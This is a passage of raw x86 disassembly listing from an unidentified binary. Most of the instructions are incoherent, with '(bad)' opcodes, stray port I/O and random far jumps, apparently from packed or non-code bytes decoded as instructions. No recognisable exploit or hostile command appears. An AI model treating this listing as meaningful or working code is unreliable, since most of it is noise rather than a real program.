  4191e2:	pop    ecx
  4191e3:	out    0xc0,al
  4191e5:	addr16 xchg edx,eax
  4191e7:	jge    0x419234
  4191e9:	les    eax,FWORD PTR [edx-0xd]
  4191ec:	and    DWORD PTR [edx],ecx
  4191ee:	(bad)  
  4191ef:	dec    ebx
  4191f0:	push   ebx
  4191f1:	mov    BYTE PTR [ebx],bl
  4191f3:	push   ds
  4191f4:	xchg   esi,eax
  4191f5:	retf   0x6fa2
  4191f8:	nop
  4191f9:	dec    edx
  4191fa:	das    
  4191fb:	adc    BYTE PTR [ebx-0x9],bh
  4191fe:	sysexit 
  419200:	pop    ebx
  419201:	(bad)  
  419202:	scas   eax,DWORD PTR es:[edi]
  419203:	test   DWORD PTR [esi+0x4b9b4983],ecx
  419209:	sbb    dl,BYTE PTR [ecx]
  41920b:	loope  0x41922e
  41920d:	add    ebp,edx
  41920f:	cmp    esi,DWORD PTR ds:0x8fbfdd06
  419215:	pop    es
  419216:	mov    dl,0x81
  419218:	cmp    bh,ah
  41921a:	lea    esi,[eax-0x25f4a37]
  419220:	jo     0x4191b0
  419222:	test   esp,edx
  419224:	fcmovu st,st(3)
  419226:	or     cl,BYTE PTR [edi+edx*4-0x6b9c6cd5]
  41922d:	push   esi
  41922e:	jae    0x41920c
  419230:	nop
  419231:	sti    
  419232:	test   al,0xe1
  419234:	or     BYTE PTR ds:0x2821491e,dh
  41923a:	xchg   esi,eax
  41923b:	sbb    cl,BYTE PTR [edi]
  41923d:	leave  
  41923e:	mov    ebp,0x77ab04c1
  419243:	xchg   ecx,eax
  419244:	inc    ebx
  419245:	mov    al,ds:0x6b7c201f
  41924a:	sub    DWORD PTR [eax+0x5479c4c9],eax
  419250:	scas   al,BYTE PTR es:[edi]
  419251:	lock xchg esi,eax
  419253:	(bad)  
  419254:	test   BYTE PTR [eax],bl
  419256:	mov    cl,0xf5
  419258:	jl     0x419225
  41925a:	dec    esp
  41925b:	xor    eax,0x263d7b9c
  419260:	mul    DWORD PTR [ebx]
  419262:	pop    edi
  419263:	and    DWORD PTR gs:[ebx],0x38
  419267:	bound  edi,QWORD PTR [ebp-0x383dd3d7]
  41926d:	cmp    DWORD PTR [edx+0x1021ed7c],ebp
  419273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419274:	data16 sub dh,BYTE PTR cs:[edx-0x5a]
  419279:	or     DWORD PTR [eax+0x4dff258b],eax
  41927f:	outs   dx,DWORD PTR ds:[esi]
  419280:	or     DWORD PTR [edi-0x6f3cd03],eax
  419286:	cs retf 
  419288:	adc    eax,0x4b554b63
  41928d:	sub    esp,DWORD PTR [esp+ebx*8+0x31]
  419291:	(bad)  
  419292:	gs jbe 0x419245
  419295:	icebp  
  419296:	jns    0x419247
  419298:	popa   
  419299:	sub    al,BYTE PTR [esi+edi*2-0x6b]
  41929d:	shr    BYTE PTR [edx+0x63],1
  4192a0:	fimul  WORD PTR [ebp+0x6e5630f5]
  4192a6:	idiv   DWORD PTR [edi]
  4192a8:	arpl   WORD PTR [edi],di
  4192aa:	dec    edi
  4192ab:	jns    0x4192f7
  4192ad:	adc    ebp,DWORD PTR ds:0x1c741b4
  4192b3:	ins    DWORD PTR es:[edi],dx
  4192b4:	mov    esi,0xdf40a0de
  4192b9:	fistp  WORD PTR [edi-0x5c8a4f5e]
  4192bf:	adc    BYTE PTR [ecx-0x4f27be89],cl
  4192c5:	dec    eax
  4192c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192c7:	leave  
  4192c8:	cmp    DWORD PTR [esi-0x387aa8f9],ebx
  4192ce:	add    al,0xbe
  4192d0:	(bad)  
  4192d1:	pop    esi
  4192d2:	mov    eax,0xeed3cef7
  4192d7:	pop    ecx
  4192d8:	(bad)  
  4192d9:	gs ins BYTE PTR es:[edi],dx
  4192db:	(bad)  
  4192dc:	jno    0x419333
  4192de:	loop   0x419262
  4192e0:	jl     0x4192ce
  4192e2:	xlat   BYTE PTR ds:[ebx]
  4192e3:	enter  0x672c,0xb7
  4192e7:	shl    ah,0xb5
  4192ea:	mov    BYTE PTR [ecx],ah
  4192ec:	int3   
  4192ed:	(bad)  
  4192ee:	lods   eax,DWORD PTR ds:[esi]
  4192ef:	xor    eax,eax
  4192f1:	push   ds
  4192f2:	jmp    0x2bb6:0x104d9906
  4192f9:	jo     0x419292
  4192fb:	mov    dl,0x2d
  4192fd:	aam    0xb0
  4192ff:	int    0x91
  419301:	inc    esi
  419302:	cmp    eax,0x870dbc5f
  419307:	rcl    cl,0x44
  41930a:	sub    esi,0x78
  41930d:	cld    
  41930e:	stos   DWORD PTR es:[edi],eax
  41930f:	cmp    BYTE PTR [edx],dl
  419311:	add    dl,dl
  419313:	jns    0x41932c
  419315:	push   ebp
  419316:	je     0x4192f0
  419318:	sub    BYTE PTR [eax],dl
  41931a:	ss in  eax,dx
  41931c:	push   edi
  41931d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41931e:	nop
  41931f:	cmp    eax,esp
  419321:	lods   al,BYTE PTR ds:[esi]
  419322:	mov    bh,0x61
  419324:	jmp    0x4192da
  419326:	loop   0x419314
  419328:	shrd   DWORD PTR [ecx+0x6fea1788],ebx,cl
  41932f:	or     DWORD PTR [edi*8+0x29880fe7],ecx
  419336:	push   0x34
  419338:	sbb    cl,BYTE PTR [esi+0x1b]
  41933b:	out    dx,al
  41933c:	dec    edx
  41933d:	push   cs
  41933e:	and    DWORD PTR [edi],eax
  419340:	cmp    al,0x3f
  419342:	sbb    DWORD PTR [ecx+0x5e],ecx
  419345:	jmp    0x1bab:0x72a28eb7
  41934c:	in     al,dx
  41934d:	sbb    esp,DWORD PTR [edi]
  41934f:	cs mov ecx,0x3d3d1288
  419355:	daa    
  419356:	sbb    al,BYTE PTR ds:[ebp+ebx*8+0x56]
  41935b:	dec    ebx
  41935c:	aad    0xa9
  41935e:	add    BYTE PTR [esp+edi*8+0x1d],bl
  419362:	stos   DWORD PTR es:[edi],eax
  419363:	(bad)  
  419364:	ficom  DWORD PTR [edx]
  419366:	ror    esp,cl
  419368:	fldcw  WORD PTR [ebx+eiz*4+0x49]
  41936c:	std    
  41936d:	sub    eax,0xa280f698
  419372:	mov    bl,0x10
  419374:	xor    al,dl
  419376:	rol    BYTE PTR [edi+edx*2+0xc],cl
  41937a:	(bad)  
  41937b:	sahf   
  41937c:	shr    eax,cl
  41937e:	inc    ebx
  41937f:	inc    edi
  419380:	push   ebp
  419381:	leave  
  419382:	iret   
  419383:	mov    cs,ebp
  419385:	jl     0x4193e1
  419387:	test   DWORD PTR [eax],ebx
  419389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41938a:	jbe    0x4193d6
  41938c:	mov    dh,0xcc
  41938e:	pop    ebx
  41938f:	test   DWORD PTR [eax],ebx
  419391:	pop    esp
  419392:	sahf   
  419393:	(bad)  
  419394:	cs pop edi
  419396:	pop    ebx
  419397:	jg     0x41939a
  419399:	stc    
  41939a:	jmp    0x419349
  41939c:	sub    eax,DWORD PTR [esi+eiz*8+0x1327a8cc]
  4193a3:	adc    eax,0x41d996be
  4193a8:	mov    eax,ds:0xc6b1eebe
  4193ad:	mov    esp,0x91311a06
  4193b2:	ins    BYTE PTR es:[edi],dx
  4193b3:	xor    dl,ah
  4193b5:	(bad)  
  4193b6:	cld    
  4193b7:	mov    esp,0x98b81f01
  4193bc:	iret   
  4193bd:	inc    ecx
  4193be:	xchg   DWORD PTR [ebp+0x34246887],edx
  4193c4:	stc    
  4193c5:	inc    edi
  4193c6:	ins    BYTE PTR es:[edi],dx
  4193c7:	xor    eax,0x740b70c5
  4193cc:	call   0xd4a5:0x24c979ec
  4193d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d4:	push   ss
  4193d5:	or     eax,0xbdd9c6e5
  4193da:	pushf  
  4193db:	enter  0x1a39,0xfb
  4193df:	ja     0x419431
  4193e1:	mov    bl,0x3c
  4193e3:	sub    dh,0x65
  4193e6:	das    
  4193e7:	lock icebp 
  4193e9:	mov    ds:0xa22ed2e4,al
  4193ee:	jge    0x419434
  4193f0:	popf   
  4193f1:	sbb    bl,bh
  4193f3:	mov    al,0xb5
  4193f5:	(bad)  
  4193f7:	sub    eax,ecx
  4193f9:	mov    bl,0x99
  4193fb:	call   0xbc734f66
  419400:	mov    edx,0x5fb0f585
  419405:	aas    
  419406:	dec    edx
  419407:	xor    BYTE PTR [ebp+0x2a],0xaf
  41940b:	xor    cl,BYTE PTR [edi+0x1d]
  41940e:	mov    cl,0x54
  419410:	fild   DWORD PTR [ebx-0xb]
  419413:	and    esi,DWORD PTR ds:0x16af05ae
  419419:	xchg   esp,eax
  41941a:	es (bad) 
  41941c:	leave  
  41941d:	sbb    DWORD PTR [ecx-0x77a75c51],edx
  419423:	mov    ch,0x23
  419425:	aas    
  419426:	hlt    
  419427:	jmp    0x5660ea78
  41942c:	dec    ebx
  41942d:	sub    al,0xf9
  41942f:	aaa    
  419430:	dec    ebx
  419431:	stos   BYTE PTR es:[edi],al
  419432:	mov    WORD PTR [ecx+ebx*2-0x4],cs
  419436:	sbb    BYTE PTR [ebx],al
  419438:	pop    ebp
  419439:	mov    esi,0x1bb45755
  41943e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41943f:	or     BYTE PTR [ebx],al
  419441:	jne    0x4194bd
  419443:	int3   
  419444:	xchg   ebp,eax
  419445:	mov    edi,DWORD PTR [edi+0x69]
  419448:	(bad)  
  419449:	stos   BYTE PTR es:[edi],al
  41944a:	pusha  
  41944b:	cmp    bh,dh
  41944d:	mov    eax,0x2b207da6
  419452:	(bad)  
  419453:	jecxz  0x41943e
  419455:	test   ecx,ecx
  419457:	mov    bh,0x85
  419459:	dec    eax
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	sbb    al,0x4
  41945d:	sub    cl,BYTE PTR [eax]
  41945f:	mov    ebx,0x44b48ef5
  419464:	xor    BYTE PTR ds:0x4612de68,ah
  41946a:	popa   
  41946b:	or     DWORD PTR [ecx-0x4d],esi
  41946e:	shl    esi,0x91
  419471:	sar    bl,0xc1
  419474:	push   edi
  419475:	cmp    eax,0xbc0c2735
  41947a:	aad    0xe6
  41947c:	test   BYTE PTR [edx+0x491e059a],0xe0
  419483:	push   ebx
  419484:	mov    WORD PTR [edx+0x6372785],?
  41948a:	out    0x92,al
  41948c:	retf   
  41948d:	ja     0x419415
  41948f:	mov    edx,0xfcef11e0
  419494:	enter  0xdfa1,0xf6
  419498:	push   ecx
  419499:	cs (bad) 
  41949b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41949c:	xchg   BYTE PTR [ebp-0x9],dh
  41949f:	adc    al,0xe
  4194a1:	dec    ecx
  4194a2:	dec    ecx
  4194a3:	cmp    ah,dh
  4194a5:	das    
  4194a6:	mov    dl,0xe
  4194a8:	pushf  
  4194a9:	xchg   DWORD PTR [ecx-0x4111a69b],ebx
  4194af:	cs sti 
  4194b1:	push   ss
  4194b2:	call   0x9fb558e8
  4194b7:	push   edx
  4194b8:	inc    esp
  4194b9:	outs   dx,BYTE PTR ds:[esi]
  4194ba:	inc    ebp
  4194bb:	sbb    BYTE PTR [esi],dl
  4194bd:	sbb    dl,BYTE PTR [ebx+0x2f]
  4194c0:	jne    0x4194f9
  4194c2:	lods   eax,DWORD PTR ds:[esi]
  4194c3:	xchg   ebp,eax
  4194c4:	enter  0x6180,0xab
  4194c8:	jbe    0x419489
  4194ca:	mov    esp,0xb36c3ada
  4194cf:	bound  ebp,QWORD PTR [eax-0x2a]
  4194d2:	fistp  WORD PTR [edi-0x35]
  4194d5:	pavgb  mm0,mm5
  4194d8:	dec    edi
  4194d9:	shr    eax,cl
  4194db:	push   edx
  4194dc:	pop    esi
  4194dd:	push   ss
  4194de:	jp     0x41955e
  4194e0:	call   0x30d4282
  4194e5:	out    0x4,eax
  4194e7:	pop    ss
  4194e8:	xor    ebp,DWORD PTR [esi+0x2c44a772]
  4194ee:	outs   dx,BYTE PTR ds:[esi]
  4194ef:	shr    BYTE PTR [esi+0x36df34a6],1
  4194f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f6:	popf   
  4194f7:	xor    eax,0xa7170f96
  4194fc:	je     0x4194a7
  4194fe:	jbe    0x419556
  419500:	dec    ecx
  419501:	test   BYTE PTR [edi+0x522e51fc],al
  419507:	or     eax,0xe9c4afb6
  41950c:	data16 (bad) 
  41950e:	and    al,0xaa
  419510:	push   esi
  419511:	sub    ebp,DWORD PTR [edi+ebp*2]
  419514:	les    eax,FWORD PTR [ecx-0x600abb97]
  41951a:	add    eax,0xf76f6632
  41951f:	out    dx,al
  419520:	push   eax
  419521:	gs pusha 
  419523:	pop    edi
  419524:	test   edi,ebx
  419526:	repz pop edi
  419528:	xchg   esp,eax
  419529:	aad    0xc8
  41952b:	dec    eax
  41952c:	push   es
  41952d:	push   edi
  41952e:	fisubr WORD PTR [ebp-0xfe6a0d1]
  419534:	scas   eax,DWORD PTR es:[edi]
  419535:	hlt    
  419536:	cmp    bl,bl
  419538:	outs   dx,BYTE PTR ds:[esi]
  419539:	sub    esi,ecx
  41953b:	fiadd  WORD PTR [ebp-0x48]
  41953e:	mov    bl,0x60
  419540:	in     eax,0xd8
  419542:	and    eax,0x4c04412e
  419547:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  419549:	xchg   DWORD PTR [ecx],esp
  41954b:	adc    eax,0x3d429508
  419550:	mov    ah,0xdb
  419552:	(bad)  
  419553:	mov    ebx,0xa426232b
  419558:	sti    
  419559:	jae    0x4194f7
  41955b:	adc    BYTE PTR [esi-0x4b],al
  41955e:	jnp    0x419503
  419560:	repnz xor eax,0x946299
  419566:	test   DWORD PTR [ecx],0xd739428f
  41956c:	jecxz  0x4195a7
  41956e:	mov    DWORD PTR [ecx+0x56],esi
  419571:	dec    edx
  419572:	or     al,0x86
  419574:	dec    eax
  419575:	das    
  419576:	repz sbb eax,0xef43e7aa
  41957c:	xor    BYTE PTR [edx],al
  41957e:	push   esi
  41957f:	(bad)  [edx]
  419581:	hlt    
  419582:	xchg   BYTE PTR [edx+0x4eee5010],dh
  419588:	fwait
  419589:	pop    ecx
  41958a:	push   es
  41958b:	mov    ds:0x7d391d40,eax
  419590:	test   ch,ah
  419592:	add    BYTE PTR [edx+eiz*2-0x1ad9d2b9],bh
  419599:	mov    al,ds:0xc8b32fc1
  41959e:	mov    dl,0xd2
  4195a0:	les    esi,FWORD PTR [ebx+0x32]
  4195a3:	jb     0x419529
  4195a5:	cmp    eax,0xca056da6
  4195aa:	fwait
  4195ab:	test   al,0x66
  4195ad:	shr    DWORD PTR [edx+0x67],1
  4195b0:	popa   
  4195b1:	nop
  4195b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195b3:	sahf   
  4195b4:	adc    DWORD PTR cs:[edx-0x4b512c29],esp
  4195bb:	sbb    BYTE PTR [edi+ebx*8+0x57],ah
  4195bf:	dec    esi
  4195c0:	(bad)  
  4195c1:	dec    ecx
  4195c2:	mov    ch,0x4e
  4195c4:	jo     0x41957f
  4195c6:	push   ds
  4195c7:	(bad)  
  4195c8:	xchg   ecx,eax
  4195c9:	out    dx,eax
  4195ca:	xchg   edx,eax
  4195cb:	hlt    
  4195cc:	lea    edx,ds:0x876c9fdc
  4195d2:	jp     0x41960c
  4195d4:	enter  0x3376,0xb4
  4195d8:	jg     0x419606
  4195da:	mov    DWORD PTR [ebx+0x71a8d42],edi
  4195e0:	xor    al,0x84
  4195e2:	mov    dh,0x6
  4195e4:	inc    esi
  4195e5:	(bad)
  4195e9:	adc    al,0x12
  4195eb:	cmp    BYTE PTR [ebp-0x66],dh
  4195ee:	call   0xcafa7355
  4195f3:	lahf   
  4195f4:	sbb    edi,DWORD PTR [edi-0x66dcf5b6]
  4195fa:	inc    ecx
  4195fb:	mov    dh,0xc9
  4195fd:	call   0xacff:0x2866444b
  419604:	or     DWORD PTR [ebx-0x63],ebx
  419607:	repz xchg esp,eax
  419609:	rcr    DWORD PTR [ecx+0x42c7c75d],cl
  41960f:	fs pop es
  419611:	sbb    bl,al
  419613:	or     esp,DWORD PTR [eax+0x1352ee46]
  419619:	push   ss
  41961a:	addr16 ret 0x7e31
  41961e:	(bad)  
  41961f:	sbb    eax,0xda2b6435
  419624:	xor    ebp,edx
  419626:	sub    DWORD PTR [edx+0x45],ecx
  419629:	mul    edx
  41962b:	ret    0xcf67
  41962e:	ins    BYTE PTR es:[edi],dx
  41962f:	cmp    al,0x15
  419631:	jne    0x41968b
  419633:	inc    eax
  419634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419635:	inc    ebp
  419636:	dec    eax
  419637:	rcl    ebp,0x29
  41963a:	pusha  
  41963b:	mov    ebx,0x2da4e91e
  419640:	out    0x6d,eax
  419642:	xchg   ebp,eax
  419643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419644:	pop    ecx
  419645:	mov    al,0x20
  419647:	adc    DWORD PTR [ecx+eax*2-0x40e62553],esi
  41964e:	pop    ebx
  41964f:	inc    edx
  419650:	pop    edi
  419651:	jnp    0x419692
  419653:	jge    0x419639
  419655:	je     0x41a17f
  41965b:	push   DWORD PTR [ebp+0x20]
  41965e:	push   DWORD PTR [ebp+0x1c]
  419661:	push   DWORD PTR [ebp+0x18]
  419664:	jmp    0x419bee
  419669:	mov    cl,bh
  41966b:	push   eax
  41966c:	inc    ax
  41966e:	push   ds
  41966f:	sbb    al,bl
  419671:	add    bl,BYTE PTR [esi-0x13]
  419674:	mov    ah,0x12
  419676:	jns    0x4196c6
  419678:	test   al,0xea
  41967a:	inc    ebp
  41967b:	or     al,0x16
  41967d:	cmp    eax,0x49161604
  419682:	int3   
  419683:	sub    DWORD PTR [edi],ebx
  419685:	sub    BYTE PTR gs:[ecx+esi*8],cl
  419689:	mov    eax,ds:0x40ec4fd3
  41968e:	cmp    esi,DWORD PTR [ecx]
  419690:	add    BYTE PTR gs:[ecx],ah
  419693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419694:	clc    
  419695:	inc    ecx
  419696:	das    
  419697:	ins    DWORD PTR es:[edi],dx
  419698:	sbb    eax,0xeb35a83
  41969d:	sbb    ebp,DWORD PTR [ecx]
  41969f:	leave  
  4196a0:	push   ecx
  4196a1:	xchg   ebx,eax
  4196a2:	sbb    BYTE PTR [ebp+0x215a80f3],ch
  4196a8:	pop    bx
  4196aa:	dec    esi
  4196ab:	push   0xbfba77cc
  4196b0:	lds    edx,FWORD PTR [ecx+0x3357652b]
  4196b6:	jg     0x41965f
  4196b8:	lods   al,BYTE PTR ds:[esi]
  4196b9:	call   FWORD PTR [ecx+0x16]
  4196bc:	mov    edi,0xce26183f
  4196c1:	cmp    ch,BYTE PTR [ecx]
  4196c3:	push   esi
  4196c4:	out    0x24,al
  4196c6:	ins    BYTE PTR es:[edi],dx
  4196c7:	test   al,0xc3
  4196c9:	sub    eax,0xed8eff0b
  4196ce:	xor    DWORD PTR ds:0xbdad7347,ebp
  4196d4:	ds jge 0x419730
  4196d7:	or     eax,0x4bd4a2a2
  4196dc:	je     0x41973d
  4196de:	pop    ebp
  4196df:	xor    eax,0x5b2d9d2f
  4196e4:	pop    edx
  4196e5:	pop    esp
  4196e6:	xchg   esi,eax
  4196e7:	mov    al,0x34
  4196e9:	jo     0x419761
  4196eb:	shr    dh,cl
  4196ed:	mov    ds:0x29025e56,eax
  4196f2:	and    DWORD PTR [edx],0x891150c
  4196f8:	popf   
  4196f9:	dec    edi
  4196fa:	xor    eax,0x5327f6d
  4196ff:	pushf  
  419700:	jbe    0x41971a
  419702:	lea    esi,[edi+0x5b1adcef]
  419708:	int3   
  419709:	das    
  41970a:	popa   
  41970b:	push   ebx
  41970c:	popf   
  41970d:	push   ecx
  41970e:	adc    DWORD PTR [edx],0x32
  419711:	pop    esi
  419712:	mov    dh,0xfe
  419714:	imul   esp,edi,0xe069723e
  41971a:	push   eax
  41971b:	sub    DWORD PTR [ebx-0x41d20d79],eax
  419721:	cmp    al,0x37
  419723:	sar    DWORD PTR [ebp-0x33],1
  419726:	fsubr  DWORD PTR [ecx+0x3b983722]
  41972c:	out    0x11,eax
  41972e:	shl    ecx,0x1c
  419731:	xor    eax,0xc573e11d
  419736:	sbb    ebp,DWORD PTR [edx-0x11]
  419739:	jno    0x419791
  41973b:	dec    eax
  41973c:	repnz lods al,BYTE PTR ds:[esi]
  41973e:	stc    
  41973f:	dec    esp
  419740:	repnz push 0xffffff99
  419743:	pushf  
  419744:	xor    BYTE PTR [ecx],al
  419746:	xor    eax,0x2bc4578f
  41974b:	int3   
  41974c:	push   ebp
  41974d:	cdq    
  41974e:	cmp    ah,BYTE PTR [esi-0x358d5062]
  419754:	jl     0x4196ff
  419756:	xor    ch,bl
  419758:	sub    eax,eax
  41975a:	mov    dl,BYTE PTR [edx+0x2c]
  41975d:	mov    ch,ah
  41975f:	lea    ecx,[ecx+edi*4-0x1f]
  419763:	pop    esp
  419764:	cli    
  419765:	xchg   edi,eax
  419766:	scas   eax,DWORD PTR es:[edi]
  419767:	inc    ebx
  419768:	jbe    0x4197da
  41976a:	xchg   BYTE PTR [eax-0x5667d090],dh
  419770:	mov    ebp,0x5e2fb152
  419775:	mov    al,0x89
  419777:	pushf  
  419778:	and    eax,0x9ed320af
  41977d:	pop    ebp
  41977e:	enter  0xb601,0x62
  419782:	aad    0xb0
  419784:	push   esp
  419785:	inc    ebp
  419786:	adc    ch,BYTE PTR [esi]
  419788:	jb     0x4197b7
  41978a:	sbb    al,0x8d
  41978c:	mov    WORD PTR [esi],es
  41978e:	scas   eax,DWORD PTR es:[edi]
  41978f:	mov    eax,0xb5210729
  419794:	jmp    0x4197fe
  419796:	sub    BYTE PTR [esi-0x55d29801],0xee
  41979d:	jmp    0x4197cb
  41979f:	dec    eax
  4197a0:	cwde   
  4197a1:	push   ebx
  4197a2:	and    BYTE PTR [edx],dl
  4197a4:	mov    bl,0x86
  4197a6:	sbb    ch,bl
  4197a8:	add    dh,BYTE PTR [edi-0x651d8626]
  4197ae:	dec    edi
  4197af:	pop    ebx
  4197b0:	test   BYTE PTR [ecx+esi*2],al
  4197b3:	mov    DWORD PTR [ebx+0x69],esp
  4197b6:	mov    bl,0x94
  4197b8:	lea    ebp,[ebx+0x31]
  4197bb:	cmc    
  4197bc:	push   esi
  4197bd:	inc    ebp
  4197be:	jle    0x4197ea
  4197c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197c1:	pop    edx
  4197c2:	(bad)  
  4197c3:	mov    dl,0xa3
  4197c5:	out    0x72,al
  4197c7:	mov    edi,0xaf72a99d
  4197cc:	mov    esp,0x8e35e5d
  4197d1:	jecxz  0x419796
  4197d3:	ret    0x716c
  4197d6:	lahf   
  4197d7:	dec    ebp
  4197d8:	mov    cl,0x3d
  4197da:	test   BYTE PTR [ebx+0x65],0x2b
  4197de:	(bad)  
  4197df:	ja     0x419762
  4197e1:	xchg   ecx,eax
  4197e2:	dec    esp
  4197e3:	stos   BYTE PTR es:[edi],al
  4197e4:	and    DWORD PTR [ebp+0x73674391],ebp
  4197ea:	and    ebp,ebx
  4197ec:	sar    DWORD PTR [edi],cl
  4197ee:	push   0xa08510bc
  4197f3:	adc    edi,ecx
  4197f5:	ss adc eax,0x4f658867
  4197fb:	mov    ecx,0x962ef689
  419800:	add    al,0x9e
  419802:	jmp    0x588e0f78
  419807:	xchg   BYTE PTR [ecx-0x35ebccf5],ah
  41980d:	push   ecx
  41980e:	(bad)  
  41980f:	aam    0xcc
  419811:	add    ecx,edx
  419813:	pop    ss
  419814:	in     eax,dx
  419815:	jmp    0x5a9a1b96
  41981a:	jo     0x419825
  41981c:	xchg   ebx,eax
  41981d:	js     0x419874
  41981f:	arpl   WORD PTR [esi-0x1f],dx
  419822:	je     0x4197b1
  419824:	mov    ebp,0x5f0a3386
  419829:	xchg   ecx,eax
  41982a:	outs   dx,BYTE PTR ds:[esi]
  41982b:	cmp    al,0x11
  41982d:	and    BYTE PTR [edi-0x9],dh
  419830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419831:	imul   esp,esi,0xffffffac
  419834:	retf   0xcd97
  419837:	imul   esp,DWORD PTR [edi],0x56
  41983a:	pop    es
  41983b:	pop    edi
  41983c:	mov    bh,0xb0
  41983e:	xor    DWORD PTR [eax+ebx*8],ebx
  419841:	cmp    bh,dl
  419843:	scas   al,BYTE PTR es:[edi]
  419844:	xor    dh,BYTE PTR [edx+0x54]
  419847:	add    ebx,DWORD PTR fs:0x292512a8
  41984e:	sar    esp,1
  419850:	jne    0x419812
  419852:	adc    BYTE PTR [edx],bh
  419854:	icebp  
  419855:	sub    ebp,DWORD PTR [ebx+0x22]
  419858:	aam    0x4
  41985a:	sbb    esi,DWORD PTR [eax*8+0x41b2be19]
  419861:	sbb    ch,BYTE PTR [eax+edi*1+0x7d]
  419865:	sbb    eax,0xf8f4d53e
  41986a:	clc    
  41986b:	lods   al,BYTE PTR ds:[esi]
  41986c:	sub    al,0x4
  41986e:	pop    esp
  41986f:	ins    DWORD PTR es:[edi],dx
  419870:	inc    edx
  419871:	xor    BYTE PTR [edx-0x6a],al
  419874:	or     ch,BYTE PTR [ebp+0x5c]
  419877:	push   eax
  419878:	or     DWORD PTR [ecx+0x3d],eax
  41987b:	dec    ebp
  41987c:	cdq    
  41987d:	xor    al,0xe7
  41987f:	test   eax,0x747f7b08
  419884:	push   ds
  419885:	icebp  
  419886:	mov    dh,BYTE PTR [ebx-0x28]
  419889:	mov    WORD PTR [ecx+0x3d],ds
  41988c:	ja     0x419859
  41988e:	dec    edi
  41988f:	lods   al,BYTE PTR ds:[esi]
  419890:	pushf  
  419891:	fs daa 
  419893:	add    DWORD PTR [ecx],eax
  419895:	mov    dh,0xc
  419897:	stos   DWORD PTR es:[edi],eax
  419898:	and    eax,0x6547bfdc
  41989d:	xchg   edx,eax
  41989e:	test   BYTE PTR ss:[edi-0xe],bh
  4198a2:	mov    ebx,edx
  4198a4:	mov    BYTE PTR [ebx+ecx*2-0x14a80d7e],0x69
  4198ac:	jo     0x4198df
  4198ae:	xchg   DWORD PTR [edi+0x8],edi
  4198b1:	pop    ebp
  4198b2:	bound  esi,QWORD PTR [esi+esi*4]
  4198b5:	call   0x7486:0x11149bf2
  4198bc:	dec    esp
  4198bd:	in     al,dx
  4198be:	sub    DWORD PTR [edi],ecx
  4198c0:	dec    ecx
  4198c1:	bound  ebx,QWORD PTR fs:[eax]
  4198c4:	xor    BYTE PTR [esi+0x3f],bl
  4198c7:	xor    ch,BYTE PTR [edx+0x5ae53f06]
  4198cd:	or     DWORD PTR [ecx-0x2764ba0c],ebx
  4198d3:	sbb    BYTE PTR [eax+0x60],bh
  4198d6:	mov    bh,ch
  4198d8:	pop    edi
  4198d9:	cwde   
  4198da:	and    bl,dl
  4198dc:	out    0x29,al
  4198de:	rol    BYTE PTR [ecx+0x6f],cl
  4198e1:	retf   
  4198e2:	add    al,0x77
  4198e4:	push   ds
  4198e5:	push   es
  4198e6:	or     edx,DWORD PTR [edi+0x2676ecca]
  4198ec:	into   
  4198ed:	pop    edx
  4198ee:	xchg   ebx,eax
  4198ef:	push   cs
  4198f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198f1:	or     al,0xb6
  4198f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198f4:	ds dec eax
  4198f6:	xor    ecx,eax
  4198f8:	retf   
  4198f9:	daa    
  4198fa:	sbb    ebx,DWORD PTR [esi+0x5d1f86dc]
  419900:	pop    esp
  419901:	out    0x6f,al
  419903:	xchg   esi,eax
  419904:	lods   eax,DWORD PTR ds:[esi]
  419905:	add    esp,DWORD PTR [ebx-0x45]
  419908:	fistp  WORD PTR [ecx+esi*2-0x2b]
  41990c:	push   ss
  41990d:	sahf   
  41990e:	jmp    0x41989f
  419910:	neg    DWORD PTR [ecx-0x552c6b45]
  419916:	push   ss
  419917:	in     eax,0xe6
  419919:	out    0x83,eax
  41991b:	leave  
  41991c:	mov    bh,0xb7
  41991e:	enter  0x43cc,0x13
  419922:	rcl    BYTE PTR [ecx-0x2f9c96f6],0xa5
  419929:	repnz cld 
  41992b:	in     eax,dx
  41992c:	jne    0x419921
  41992e:	test   al,0x37
  419930:	pop    ebx
  419931:	sub    al,0xa0
  419933:	xor    al,0x44
  419935:	adc    ebp,DWORD PTR [edi+0x7c51ca7d]
  41993b:	add    ch,BYTE PTR [ecx]
  41993d:	push   0x69
  41993f:	xchg   DWORD PTR [esi-0x6f76a0dc],edi
  419945:	ins    BYTE PTR es:[edi],dx
  419946:	sub    edx,ebx
  419948:	in     eax,dx
  419949:	push   edx
  41994a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41994b:	fdivp  st(1),st
  41994d:	add    al,0x65
  41994f:	repnz lahf 
  419951:	pop    edx
  419952:	jmp    0x4199b8
  419954:	scas   al,BYTE PTR es:[edi]
  419955:	push   esp
  419956:	rcl    BYTE PTR [ebx],0xee
  419959:	cmp    BYTE PTR [edx-0x6121bc1b],bh
  41995f:	cmc    
  419960:	(bad)  [eax-0x54]
  419963:	jg     0x4199b6
  419965:	jno    0x4199dc
  419967:	add    ah,bh
  419969:	das    
  41996a:	inc    edx
  41996b:	fild   DWORD PTR [eax]
  41996d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41996e:	and    ebx,DWORD PTR [edx*1+0x78996554]
  419975:	mov    esi,0x7c3a8f19
  41997a:	push   ss
  41997b:	cwde   
  41997c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41997d:	push   ss
